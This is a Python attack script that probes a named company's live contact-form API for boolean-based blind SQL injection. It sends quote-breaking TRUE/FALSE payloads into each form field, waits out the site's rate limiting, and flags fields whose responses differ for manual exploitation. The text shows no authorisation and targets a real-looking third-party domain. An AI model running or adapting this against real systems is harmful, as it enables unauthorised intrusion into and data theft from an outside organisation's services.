#!/usr/bin/env python3
"""Prove or disprove a boolean SQLi oracle on POST /api/send.

Logic: a REAL boolean-based blind injection requires the server's behaviour to
differ between  TRUE  (cond AND 1=1)  and  FALSE (cond AND 1=2)  predicates.
We canonicalise the JSON body (sort keys) so that mere key-ORDER differences
do not create a false differential, and we also repeat the SAME value several
times to measure natural response variance.
"""
import json, time, urllib.parse, subprocess, hashlib, sys

URL = "https://www.infinitycapital.bh/api/send"
BASE = {"lname": "b", "cname": "c", "subject": "s", "msg": "m",
        "areacode": "973", "tel": "1234", "check": "0", "targets": "t"}


def post(field, value):
    data = dict(BASE)
    data[field] = value
    body = "&".join("%s=%s" % (k, urllib.parse.quote(str(v)))
                    for k, v in data.items())
    out = subprocess.run(
        ["curl", "-sk", "--max-time", "25", "-w", "\n__CODE__%{http_code}",
         "-X", "POST", URL, "-d", body],
        capture_output=True, text=True).stdout
    raw, _, code = out.rpartition("__CODE__")
    code = code.strip()
    try:
        canon = json.dumps(json.loads(raw), sort_keys=True)
    except Exception:
        canon = "NONJSON:" + raw.strip()
    return code, canon, hashlib.md5(canon.encode()).hexdigest()[:12], raw


def wait_for_ok():
    for _ in range(40):
        code, *_ = post("fname", "probe")
        if code != "429":
            return code
        time.sleep(5)
    return code


print("waiting out the Vercel 429 cooldown ->", wait_for_ok())

TRUE = "INJXMARK' AND '1'='1"
FALSE = "INJXMARK' AND '1'='2"
BASEV = "INJXMARK"

print("\n=== 1. repeat the SAME baseline value 5x (measures natural variance) ===")
hashes = {}
for i in range(5):
    c, canon, h, _ = post("fname", BASEV)
    print("  run%d code=%s hash=%s" % (i, c, h))
    hashes.setdefault(h, 0)
    hashes[h] += 1
    time.sleep(1)
print("  distinct canonical hashes for an identical payload:", len(hashes))

print("\n=== 2. TRUE vs FALSE vs BASELINE on each injectable-candidate field ===")
for field in ("fname", "lname", "cname", "subject", "msg"):
    row = {}
    for label, val in (("base", BASEV), ("true", TRUE), ("false", FALSE)):
        c, canon, h, raw = post(field, val)
        row[label] = (c, h)
        print("  %-8s %-5s code=%s hash=%s" % (field, label, c, h))
        time.sleep(1)
    ct, ht = row["true"]
    cf, hf = row["false"]
    cb, hb = row["base"]
    differential = not (ht == hf == hb)
    print("  -> %s: TRUE/FALSE/BASE differ? %s" % (field, differential))
    if differential:
        print("     !! candidate TRUE ORACLE -- investigate manually")
    print()
print("done")
